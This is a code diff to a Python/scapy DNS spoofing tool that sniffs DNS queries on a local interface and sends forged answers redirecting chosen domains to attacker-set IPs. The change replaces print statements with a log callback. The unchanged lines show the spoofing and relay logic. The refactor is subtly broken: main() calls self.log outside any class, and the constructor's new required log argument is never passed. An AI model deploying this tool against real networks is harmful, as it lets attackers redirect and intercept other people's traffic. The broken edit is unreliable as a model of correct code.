@@ -8,7 +8,7 @@ import sys
 import threading
 import time
 from pathlib import Path
-from typing import Dict, Optional
+from typing import Dict, Optional, Callable
 
 import yaml
 from scapy.all import (
@@ -28,6 +28,7 @@ class DNSSpoofer(threading.Thread):
         self,
         iface: str,
         mapping: Dict[str, str],
+        log: Callable[[str], None],
         upstream: Optional[str] = None,
         relay: bool = False,
     ) -> None:
@@ -38,6 +39,7 @@ class DNSSpoofer(threading.Thread):
         self.upstream = upstream or "8.8.8.8"
         self.running = threading.Event()
         self.running.set()
+        self.log = log
 
     def _matches(self, qname: str) -> Optional[str]:
         """Return spoof IP if qname matches mapping, else None."""
@@ -77,7 +79,7 @@ class DNSSpoofer(threading.Thread):
                 self._build_answer(pkt[DNS], spoof_ip)
             )
             send(forged, iface=self.iface, verbose=False)
-            print("[+] Spoofed {} → {} for {}".format(qname, spoof_ip, victim_ip))
+            self.log("[+] Spoofed {} → {} for {}".format(qname, spoof_ip, victim_ip))
 
         elif self.relay:
             self._relay(pkt)
@@ -97,14 +99,14 @@ class DNSSpoofer(threading.Thread):
                 DNS(data)
             )
             send(answer, iface=self.iface, verbose=False)
-            print("[=] Relayed {} to {}".format(pkt[DNSQR].qname.decode(), pkt[IP].src))
+            self.log("[=] Relayed {} to {}".format(pkt[DNSQR].qname.decode(), pkt[IP].src))
         except socket.timeout:
-            print("[!] Upstream DNS timeout; dropping query")
+            self.log("[!] Upstream DNS timeout; dropping query")
         finally:
             sock.close()
 
     def run(self):
-        print("[*] DNS spoofing active on {}. Relay={}".format(self.iface, self.relay ))
+        self.log("[*] DNS spoofing active on {}. Relay={}".format(self.iface, self.relay ))
         sniff(
             iface=self.iface,
             filter="udp port 53",
@@ -124,7 +126,7 @@ def load_mapping(path: Path) -> Dict[str, str]:
         try:
             ipaddress.ip_address(v)
         except ValueError:
-            #print(f"[!] Invalid IP in mapping: {v}")
+            #self.log(f"[!] Invalid IP in mapping: {v}")
             continue
         mapping[k.lower()] = v
     return mapping
@@ -146,7 +148,7 @@ def main():
 
     mapping = load_mapping(args.map)
     if not mapping:
-        print("[!] No valid mappings – aborting")
+        self.log("[!] No valid mappings – aborting")
         sys.exit(1)
 
     spoofer = DNSSpoofer(args.iface, mapping, upstream=args.upstream, relay=args.relay)
@@ -154,7 +156,7 @@ def main():
 
     # Handle Ctrl-C for clean shutdown
     def _sigint(_sig, _frame):
-        print("\n[!] Ctrl-C received, shutting down…")
+        self.log("\n[!] Ctrl-C received, shutting down…")
         spoofer.stop()
 
     signal.signal(signal.SIGINT, _sigint)
@@ -162,7 +164,7 @@ def main():
     while spoofer.is_alive():
         time.sleep(0.5)
 
-    print("[+] Bye!")
+    self.log("[+] Bye!")
 
 if __name__ == "__main__":
     main()
